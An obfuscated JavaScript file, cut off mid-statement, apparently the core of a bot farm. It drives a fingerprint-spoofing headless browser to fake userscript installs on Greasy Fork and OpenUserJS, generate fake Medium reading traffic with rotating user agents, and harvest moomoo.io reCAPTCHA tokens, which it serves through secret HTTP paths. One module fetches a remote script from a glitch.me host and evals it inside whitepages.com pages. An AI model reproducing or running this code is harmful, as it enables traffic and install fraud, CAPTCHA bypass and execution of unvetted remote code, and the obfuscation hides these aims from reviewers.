    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + W(0x4) + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0xf) + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + U(0x1, 'Dy$Z') + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + U(0x8, '2gU7') + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1663 + 0x88a + -0x1eed
  };

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x2256 + -0x7 * 0x62 + 0x2504);
    let h = e[f];
    if (c['pDqvrr'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x89 * -0x36 + -0x1 * 0x1303 + -0xb * -0x45b, r, s, t = 0x265a * 0x1 + 0x1e0 * -0x13 + -0x2 * 0x15d; s = m['charAt'](t++); ~s && (r = q % (0x1 * -0x1fcf + -0x1f19 + 0x2 * 0x1f76) ? r * (0xd * 0x293 + -0x20aa + -0x8d) + s : s, q++ % (-0x188f + 0xda8 + 0x22f * 0x5)) ? o += String['fromCharCode'](-0x3 * -0x10 + -0x1 * -0x1b83 + -0x1ab4 & r >> (-(-0x3 * -0x241 + 0xf79 + -0xa * 0x239) * q & 0xee0 * -0x1 + -0xee6 + 0x1dcc)) : -0x13ce + 0x9 * 0x2b4 + 0x243 * -0x2) {
          s = n['indexOf'](s);
        }
        for (let u = -0x8b0 + -0xf4 + -0x4 * -0x269, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1dc4 + -0x19c7 * 0x1 + 0x379b))['slice'](-(0x21d * -0x12 + 0x609 + -0x2003 * -0x1));
        }
        return decodeURIComponent(p);
      };
      c['KsUNah'] = i, b = arguments, c['pDqvrr'] = !![];
    }
    const j = e[-0x9 * 0x3ae + -0x18d + -0x7d * -0x47],
      k = f + j,
      l = b[k];
    return !l ? (h = c['KsUNah'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x2 * -0x120a + -0xc32 + -0x17e2)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            const X = d;
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': X(0x6)
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x7a2 + -0x1a17 + -0x1 * -0x12d9), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1a84 + 0x26d * -0xd + -0x1 * -0x569), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x2d + 0x15 * 0x85 + 0xabc * -0x1;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x7f4 + 0x148 * 0x8 + -0x1234; w < getRandomInt(0x1429 + -0x1 * 0x148c + 0x64, 0xeb1 * -0x2 + -0x18bd + 0x3624); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0xaca1 + -0x31de + 0x6f9d * 0x1);
        }
      }();
    }, -0x7 * -0x15b + -0x2293 + 0x197a), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Z = b;

      function u() {
        const Y = c;
        axios['post']('https://st' + 'ratums.io/' + Y(0xa), {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0xa1 * -0xa + -0x22ea + 0x2934;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x[Z(0x14, '$5g!')]('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x551 + -0x4 * -0x567 + -0x104b, 0x8a6 + -0x1046 + -0x7 * -0x11e)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x53db + -0x82ef * 0x1 + 0x14bfa);
    }, 0x18df + 0x1 * -0x1d35 + 0x4ba), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1 * 0xea1 + -0x4 * -0x1c + 0xe31;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x22a9 + -0x9bb + -0x26 * 0x59), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1e41 * 0x1 + -0x29b + 0x2 * -0xdd3), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x3a263 * -0x3 + 0x1ac87f + -0x112db * 0x2);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x22b5 + 0xc0 * -0x30 + -0x17b3 * -0x3);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1 * 0xf90 + 0x1d2c + -0xcd4);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x2 * 0x373 + 0x28e3 + -0x26d);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = d,
    a0 = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x466 + 0x1 * -0x723 + -0x1a * -0x1b) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1d * -0xfb + -0x13e8 + -0x886));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x2021 + -0x187d * -0x1 + -0x389e, D['indexOf']('\x20'));
        return B ? E['slice'](-0x3 * 0x97f + 0x1351 + 0x92c, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x15e3 * 0x1 + 0xcf * -0x29 + 0x3254),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x18a5 + -0x3 * -0x10b2 + -0x23ab),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a0(0x2, 'Q)]6') + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      a1(0x0) + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1a3 * -0x11 + 0xd84 + -0x2957; k < -0x1f05 + -0x970 + 0x2879; k++)
    setTimeout(f, (0x16f03 + -0x3 * -0x1ac3 + 0x6a76 * -0x2) * k * getRandomInt(0x6ab + 0xc * 0x117 + -0x13be, -0x3 * 0x14c + 0x1a3e + -0x1657));
  setInterval(() => {
    f();
    for (let l = -0x21dd + 0x3d * -0xe + 0x2533; l < 0x1f8f + -0x146 * 0xb + 0x1 * -0x1189; l++)
      setTimeout(f, (0x8c27 * -0x1 + 0x7ca9 + 0xf9de) * l * getRandomInt(0x29c + -0x2566 + -0xb99 * -0x3, -0x999 + -0x2178 + -0x2b14 * -0x1));
  }, -0x1 * 0x239d16 + 0x2e3adc + 0x2c50ba);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
